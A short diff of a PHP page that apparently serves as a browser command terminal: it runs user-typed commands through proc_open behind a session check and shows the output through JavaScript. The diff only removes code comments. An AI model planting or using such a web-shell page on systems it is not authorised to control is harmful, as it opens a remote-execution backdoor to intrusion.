@@ -13,9 +13,9 @@ if (!isset($_SESSION['authenticated'])) {
 
 function executeCommand($command) {
     $descriptorspec = array(
-       0 => array("pipe", "r"),  // stdin
-       1 => array("pipe", "w"),  // stdout
-       2 => array("pipe", "w")   // stderr
+       0 => array("pipe", "r"),
+       1 => array("pipe", "w"),
+       2 => array("pipe", "w")
     );
 
     $process = proc_open($command, $descriptorspec, $pipes, realpath('./'), array());
@@ -100,7 +100,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear') {
                     var output = document.getElementById('output');
                     var command = document.getElementById('commandInput').value;
                     output.innerHTML += xhr.responseText;
-                    output.scrollTop = output.scrollHeight;  // Scroll to bottom
+                    output.scrollTop = output.scrollHeight;
                     document.getElementById('commandInput').value = '';
                 }
             };
@@ -131,7 +131,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'clear') {
                 if (xhr.readyState === 4 && xhr.status === 200) {
                     var output = document.getElementById('output');
                     output.innerHTML += xhr.responseText;
-                    output.scrollTop = output.scrollHeight;  // Scroll to bottom
+                    output.scrollTop = output.scrollHeight; 
                     document.getElementById('fileInput').value = '';
                 }
             };
